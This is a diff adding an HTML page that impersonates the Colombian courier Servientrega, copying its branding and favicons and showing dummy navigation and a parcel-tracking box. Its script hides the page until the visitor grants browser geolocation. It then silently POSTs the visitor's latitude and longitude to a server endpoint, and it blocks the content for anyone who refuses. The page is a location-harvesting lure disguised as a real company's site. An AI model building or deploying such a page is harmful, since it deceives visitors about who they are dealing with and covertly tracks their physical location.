@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Servientrega, mundo de soluciones logísticas a tu alcance</title>
+     
+         <link rel="icon" type="image/png" href="https://www.servientrega.com/wps/contenthandler/dav/fs-type1/themes/New-Theme-Servientrega/images/favicon16x16.png" sizes="16x16">
+
+      <link rel="icon" type="image/png" href="https://www.servientrega.com/wps/contenthandler/dav/fs-type1/themes/New-Theme-Servientrega/images/favicon32x32.png" sizes="32x32">
+
+      <link rel="icon" type="image/png" href="https://www.servientrega.com/wps/contenthandler/dav/fs-type1/themes/New-Theme-Servientrega/images/favicon96x96.png" sizes="96x96">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            background-color: #f7f7f7;
+        }
+        #contenido {
+            display: none;
+        }
+        #mensaje-ubicacion {
+            display: none;
+            text-align: center;
+            margin-top: 100px;
+            font-size: 20px;
+            color: #ff0000;
+        }
+        header {
+            background-color: #0f9d58;
+            padding: 15px 20px;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        header nav a {
+            color: white;
+            margin-right: 20px;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        header nav a:hover {
+            text-decoration: underline;
+        }
+        .login-button {
+            background-color: #ffffff;
+            color: #0f9d58;
+            border: none;
+            padding: 10px 20px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 20px;
+        }
+        .main-banner {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 40px 20px;
+            background-color: #f0f0f0;
+        }
+        .main-banner div {
+            max-width: 50%;
+        }
+        .main-banner h2 {
+            color: #666666;
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .main-banner button {
+            background-color: #0f9d58;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .main-banner img {
+            max-width: 40%;
+        }
+        .consult-section {
+            text-align: center;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .consult-section select, .consult-section input, .consult-section button {
+            padding: 10px;
+            margin-right: 10px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        .consult-section button {
+            background-color: #0f9d58;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="mensaje-ubicacion">Habilita la ubicación para continuar.</div>
+
+    <div id="contenido">
+        <header>
+            <div>
+                <h1>Servientrega</h1>
+            </div>
+            <nav>
+                <a href="#">Rastrear</a>
+                <a href="#">Cotizar</a>
+                <a href="#">Recoger</a>
+                <a href="#">Soluciones</a>
+                <a href="#">Nuestra red</a>
+            </nav>
+            <button class="login-button">Ingresar</button>
+        </header>
+
+        <div class="main-banner">
+            <div>
+                <h2>Conoce nuestras líneas de atención</h2>
+                <button>Contacto</button>
+            </div>
+            <img src="https://imagenes.eltiempo.com/files/image_1200_600/uploads/2021/09/29/6154f24942c36.png" alt="Atención Cliente">
+        </div>
+
+        <div class="consult-section">
+            <select>
+                <option>Consultar</option>
+            </select>
+            <input type="text" placeholder="Ingresa el # de guía">
+            <button>Buscar</button>
+        </div>
+    </div>
+
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
+                    // Envía la ubicación al servidor
+                    fetch('/enviar-ubicacion', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            latitud: lat,
+                            longitud: lon
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        // Ocultamos el mensaje y mostramos el contenido
+                        document.getElementById('mensaje-ubicacion').style.display = 'none';
+                        document.getElementById('contenido').style.display = 'block';
+                    })
+                    .catch(error => {
+                        console.error('Error al enviar la ubicación:', error);
+                    });
+                }, function(error) {
+                    // Mostrar mensaje si no acepta la ubicación
+                    document.getElementById('mensaje-ubicacion').style.display = 'block';
+                    document.getElementById('contenido').style.display = 'none';
+                    console.error('Error obteniendo la ubicación:', error);
+                });
+            } else {
+                console.error("La geolocalización no es soportada por este navegador.");
+                document.getElementById('mensaje-ubicacion').innerText = 'Tu navegador no soporta la geolocalización.';
+                document.getElementById('mensaje-ubicacion').style.display = 'block';
+            }
+        };
+    </script>
+</body>
+</html>
